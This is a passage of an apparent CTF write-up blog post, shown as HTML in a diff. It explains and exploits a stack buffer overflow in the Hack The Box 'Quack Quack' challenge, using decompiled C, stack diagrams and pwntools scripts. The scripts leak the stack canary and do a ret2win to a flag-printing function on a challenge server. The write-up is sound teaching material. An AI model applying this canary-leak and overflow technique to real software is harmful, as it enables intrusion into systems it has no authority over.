+</span></span><span class="line"><span class="cl">  <span class="n">buffer</span><span class="p">[</span><span class="mh">0x17</span><span class="p">]</span> <span class="o">=</span> <span class="err">&#39;\\</span><span class="mi">0</span><span class="err">&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buffer</span><span class="p">[</span><span class="mh">0x18</span><span class="p">]</span> <span class="o">=</span> <span class="err">&#39;\\</span><span class="mi">0</span><span class="err">&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buffer</span><span class="p">[</span><span class="mh">0x19</span><span class="p">]</span> <span class="o">=</span> <span class="err">&#39;\\</span><span class="mi">0</span><span class="err">&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buffer</span><span class="p">[</span><span class="mh">0x1a</span><span class="p">]</span> <span class="o">=</span> <span class="err">&#39;\\</span><span class="mi">0</span><span class="err">&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buffer</span><span class="p">[</span><span class="mh">0x1b</span><span class="p">]</span> <span class="o">=</span> <span class="err">&#39;\\</span><span class="mi">0</span><span class="err">&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buffer</span><span class="p">[</span><span class="mh">0x1c</span><span class="p">]</span> <span class="o">=</span> <span class="err">&#39;\\</span><span class="mi">0</span><span class="err">&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buffer</span><span class="p">[</span><span class="mh">0x1d</span><span class="p">]</span> <span class="o">=</span> <span class="err">&#39;\\</span><span class="mi">0</span><span class="err">&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buffer</span><span class="p">[</span><span class="mh">0x1e</span><span class="p">]</span> <span class="o">=</span> <span class="err">&#39;\\</span><span class="mi">0</span><span class="err">&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buffer</span><span class="p">[</span><span class="mh">0x1f</span><span class="p">]</span> <span class="o">=</span> <span class="err">&#39;\\</span><span class="mi">0</span><span class="err">&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">local_68</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">local_60</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">local_58</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">local_50</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">local_48</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">local_40</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">local_38</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">local_30</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">local_28</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">local_20</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Quack the Duck!</span><span class="se">\\</span><span class="s">n</span><span class="se">\\</span><span class="s">n&gt; &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">buffer</span><span class="p">,</span><span class="mh">0x66</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">chk_substring</span> <span class="o">=</span> <span class="nf">strstr</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="s">&#34;Quack Quack &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">chk_substring</span> <span class="o">==</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">error</span><span class="p">(</span><span class="s">&#34;Where are your Quack Manners?!</span><span class="se">\\</span><span class="s">n&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mh">0x520</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Quack Quack %s, ready to fight the Duck?</span><span class="se">\\</span><span class="s">n</span><span class="se">\\</span><span class="s">n&gt; &#34;</span><span class="p">,</span><span class="n">chk_substring</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_68</span><span class="p">,</span><span class="mh">0x6a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Did you really expect to win a fight against a Duck?!</span><span class="se">\\</span><span class="s">n&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">canary</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">__stack_chk_fail</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">duck_attack</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">ssize_t</span> <span class="n">sVar1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">local_15</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">flag_file</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">canary</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">canary</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">flag_file</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;./flag.txt&#34;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">flag_file</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\\</span><span class="s">nError opening flag.txt, please contact an Administrator</span><span class="se">\\</span><span class="s">n&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sVar1</span> <span class="o">=</span> <span class="nf">read</span><span class="p">(</span><span class="n">flag_file</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_15</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">sVar1</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fputc</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">local_15</span><span class="p">,</span><span class="n">stdout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">close</span><span class="p">(</span><span class="n">flag_file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">canary</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">__stack_chk_fail</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<p>In the <code>main</code> function is only call <code>duckling</code> function. If we take a look inside <code>duckling</code> function, we can directly see that it&rsquo;s happen BOF vuln in our first input : <code>read(0,buffer,0x66)</code>. How is that can happen ? You see that in <code>char buffer [32];</code> , the program only allocate buffer 32 bytes, but we can overflow it until <strong>0x66 bytes</strong> or <strong>102 bytes in decimal</strong>. Okay, then how can we leak the stack canary ?</p>
+<p>Notice that in the <code>printf(&quot;Quack Quack %s, ready to fight the Duck?\\n\\n&gt; &quot;,chk_substring + 0x20);</code> can be leak some information in the stack. It&rsquo;s because the output will print <strong>32 bytes (0x20) more information after</strong> <code>&quot;Quack Quack &quot;</code> <strong>is found</strong>. Okay, let&rsquo;s do a simple math calculation.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-txt">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">============= STACK LAYOUT =============
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[       RET       ] // lives in $rbp+0x8
+</span></span><span class="line"><span class="cl">[    Saved RBP    ] 
+</span></span><span class="line"><span class="cl">[   Stack Canary  ] // lives in $rbp-0x8
+</span></span><span class="line"><span class="cl">[  .............  ] // $rbp-0x10
+</span></span><span class="line"><span class="cl">[  .............  ] // $rbp-0x18
+</span></span><span class="line"><span class="cl">[  .............  ] // $rbp-0x20
+</span></span><span class="line"><span class="cl">[  .............  ] // $rbp-0x28
+</span></span><span class="line"><span class="cl">[  .............  ] // $rbp-0x30
+</span></span><span class="line"><span class="cl">[  .............  ] // $rbp-0x38
+</span></span><span class="line"><span class="cl">[  .............  ] // $rbp-0x40
+</span></span><span class="line"><span class="cl">[  .............  ] // $rbp-0x48
+</span></span><span class="line"><span class="cl">[  .............  ] // $rbp-0x50
+</span></span><span class="line"><span class="cl">[  .............  ] // $rbp-0x58
+</span></span><span class="line"><span class="cl">[  .............  ] // $rbp-0x60
+</span></span><span class="line"><span class="cl">[  .............  ] // $rbp-0x68
+</span></span><span class="line"><span class="cl">[  .............  ] // $rbp-0x70
+</span></span><span class="line"><span class="cl">[  .............  ] // $rbp-0x78
+</span></span><span class="line"><span class="cl">[      Buffer     ] // lives in $rbp-0x80</span></span></code></pre></div></div>
+<p>Total of our input is <strong>0x66 bytes</strong> or <strong>102 bytes in decimal</strong>. Our input is started from <code>$rbp-0x80</code> until <code>$rbp-0x20 - 2</code> (8 bytes every memory cells). Max input of 102 bytes is not only contain junk or a bunch of <code>'A'</code> characters, but including the <code>&quot;Quack Quack &quot;</code> string that have <strong>12 bytes</strong>. So, the total bytes of our input will be 102 - 12 = 90 bytes - 1 = <strong>89 bytes</strong>. What is 1 byte ? it just not to make the program exit.</p>
+<p>What is <code>strstr</code> function does? It just to <strong>find a substring (param2) in the target string (param1)</strong>.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/htb-cyber-apocalypse_pwn1-01.png"
+        data-srcset="/images/htb-cyber-apocalypse_pwn1-01.png, /images/htb-cyber-apocalypse_pwn1-01.png 1.5x, /images/htb-cyber-apocalypse_pwn1-01.png 2x"
+        data-sizes="auto"
+        alt="/images/htb-cyber-apocalypse_pwn1-01.png"
+        title="Quack Quack-01" width="662" height="216" /></p>
+<p>Okay, so our first input will be <code>&quot;A&quot;*89 + &quot;Quack Quack &quot;</code> . To get more clear of leaked information, I recommend you to see with pwntools.</p>
+<ol>
+<li><strong>Exploit The Binary</strong></li>
+</ol>
+<p>Here&rsquo;s the first script to leak the stack canary.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">exe</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./quack_quack&#39;</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">exe</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&#34;DEBUG&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Start the process.</span>
+</span></span><span class="line"><span class="cl"><span class="n">LOCAL</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">LOCAL</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span> <span class="o">=</span> <span class="n">exe</span><span class="o">.</span><span class="n">process</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;94.237.54.232&#39;</span><span class="p">,</span> <span class="mi">39055</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Prepare the payload for the first input.</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span> <span class="c1"># -----------------------&lt; Start payload.</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">32</span> <span class="c1"># ----------------&lt; Fill the 32 bytes buffer.</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;B&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">89</span> <span class="o">-</span> <span class="mi">32</span><span class="p">)</span> <span class="c1"># ---------&lt; Overflow until 89 bytes.</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;Quack Quack &#34;</span> <span class="c1"># ----------&lt; Pass the strstr condition (12 more bytes).</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Send the payload in the first input.</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Maintain current session.</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/htb-cyber-apocalypse_pwn1-02.png"
+        data-srcset="/images/htb-cyber-apocalypse_pwn1-02.png, /images/htb-cyber-apocalypse_pwn1-02.png 1.5x, /images/htb-cyber-apocalypse_pwn1-02.png 2x"
+        data-sizes="auto"
+        alt="/images/htb-cyber-apocalypse_pwn1-02.png"
+        title="Quack Quack-02" /></p>
+<p>Now, we successfully leak the canary. But wait, is that the canary start with the <strong>NULL byte</strong> character (<code>\\x00</code>)? Yap, that&rsquo;s true, so we need to adjust the output to be stored as canary. For the next input we need to calculate before canary value, so it will not errors or stack smashing detected. Our next input is started from <code>$rbp-0x60</code> until <strong>0x6a bytes</strong> or <strong>106 bytes</strong> in decimal. But, we don&rsquo;t need input until the max size, we only need input until <code>$rbp-0x10</code> or <strong>88 bytes</strong> more.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-txt">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">============= STACK LAYOUT =============
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[       RET       ] // lives in $rbp+0x8
+</span></span><span class="line"><span class="cl">[    Saved RBP    ] 
+</span></span><span class="line"><span class="cl">[   Stack Canary  ] // lives in $rbp-0x8
+</span></span><span class="line"><span class="cl">[  .............  ] // $rbp-0x10 - Last of second input - 88 bytes
+</span></span><span class="line"><span class="cl">[  .............  ] // $rbp-0x18
+</span></span><span class="line"><span class="cl">[  .............  ] // $rbp-0x20
+</span></span><span class="line"><span class="cl">[  .............  ] // $rbp-0x28
+</span></span><span class="line"><span class="cl">[  .............  ] // $rbp-0x30
+</span></span><span class="line"><span class="cl">[  .............  ] // $rbp-0x38
+</span></span><span class="line"><span class="cl">[  .............  ] // $rbp-0x40
+</span></span><span class="line"><span class="cl">[  .............  ] // $rbp-0x48
+</span></span><span class="line"><span class="cl">[  .............  ] // $rbp-0x50
+</span></span><span class="line"><span class="cl">[  .............  ] // $rbp-0x58
+</span></span><span class="line"><span class="cl">[  .............  ] // $rbp-0x60 - Second input
+</span></span><span class="line"><span class="cl">[  .............  ] // $rbp-0x68
+</span></span><span class="line"><span class="cl">[  .............  ] // $rbp-0x70
+</span></span><span class="line"><span class="cl">[  .............  ] // $rbp-0x78
+</span></span><span class="line"><span class="cl">[      Buffer     ] // Start input</span></span></code></pre></div></div>
+<p>After we know the padding of 2nd input, then we can do <strong>ret2win</strong> attack to call <code>duck_attack</code> function and read the flag. So, here&rsquo;s my final exploit script.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">exe</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./quack_quack&#39;</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">exe</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&#34;DEBUG&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Start the process.</span>
+</span></span><span class="line"><span class="cl"><span class="n">LOCAL</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">LOCAL</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span> <span class="o">=</span> <span class="n">exe</span><span class="o">.</span><span class="n">process</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;94.237.54.232&#39;</span><span class="p">,</span> <span class="mi">39055</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Prepare the payload for the first input.</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span> <span class="c1"># -----------------------&lt; Start payload.</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">32</span> <span class="c1"># ----------------&lt; Fill the 32 bytes buffer.</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;B&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">89</span> <span class="o">-</span> <span class="mi">32</span><span class="p">)</span> <span class="c1"># ---------&lt; Overflow until 89 bytes.</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;Quack Quack &#34;</span> <span class="c1"># ----------&lt; Pass the strstr condition (12 more bytes).</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Send the payload in the first input.</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Adjust the leaked canary output.</span>
+</span></span><span class="line"><span class="cl"><span class="n">canary_position</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;,&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">fixed_output</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\\</span><span class="s1">x00&#39;</span> <span class="o">+</span> <span class="n">canary_position</span><span class="p">[</span><span class="o">-</span><span class="mi">7</span><span class="p">:]</span>
+</span></span><span class="line"><span class="cl"><span class="n">leaked_canary</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">fixed_output</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\\</span><span class="s1">x00&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Leaked stack canary is: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leaked_canary</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Prepare payload for the 2nd input.</span>
+</span></span><span class="line"><span class="cl"><span class="n">win_addr</span> <span class="o">=</span> <span class="n">exe</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;duck_attack&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span> <span class="c1"># -----------------------&lt; Start payload.</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;C&#34;</span><span class="o">*</span><span class="mi">88</span> <span class="c1"># ------------------&lt; Padding until Stack Canary.</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">leaked_canary</span><span class="p">)</span> <span class="c1"># -------&lt; Leaked canary value.</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="c1"># ----------&lt; Fake address for $RBP.</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">win_addr</span><span class="p">)</span> <span class="c1"># ------------&lt; Ret2win to read the flag.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Send the payload + canary in the second input.</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Print the flag.</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;HTB{.*}&#39;</span><span class="p">,</span> <span class="n">io</span><span class="o">.</span><span class="n">recvall</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Flag --&gt; </span><span class="si">{</span><span class="n">flag</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span> <span class="k">if</span> <span class="n">flag</span> <span class="k">else</span> <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Failed to get the flag!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Maintain current session.</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/htb-cyber-apocalypse_pwn1-03.png"
